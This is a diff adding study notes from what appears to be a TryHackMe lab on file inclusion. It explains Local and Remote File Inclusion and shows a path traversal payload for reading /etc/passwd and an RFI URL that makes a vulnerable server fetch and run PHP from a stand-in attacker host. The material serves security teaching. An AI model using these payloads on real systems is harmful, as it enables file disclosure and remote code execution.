@@ -142,3 +142,32 @@ This works because the PHP filter only matches and replaces the first subset str
 Try out Lab #5 and try to read /etc/passwd and bypass the filter!
 
 **#6.** Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: `http://webapp.thm/index.php?lang=languages/EN.php` then, to exploit this, we need to include the directory in the payload like so: `?lang=languages/../../../../../etc/passwd`.
+**(by this taks 5 end)**
+
+--------------------------------------------------------------------
+
+Remote File Inclusion - RFI
+
+Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.
+
+The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
+
+- Sensitive Information Disclosure
+- Cross-site Scripting (XSS)
+- Denial of Service (DoS)
+
+An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.
+
+RFI steps
+
+![[RFI setups.png]]
+
+The figure above is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message Hello THM.
+
+```php
+<?PHP echo "Hello THM"; ?>
+```
+
+First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
+
+Visit the following lab URL: http://10.10.3.195/playground.php to try out an RFI attack.
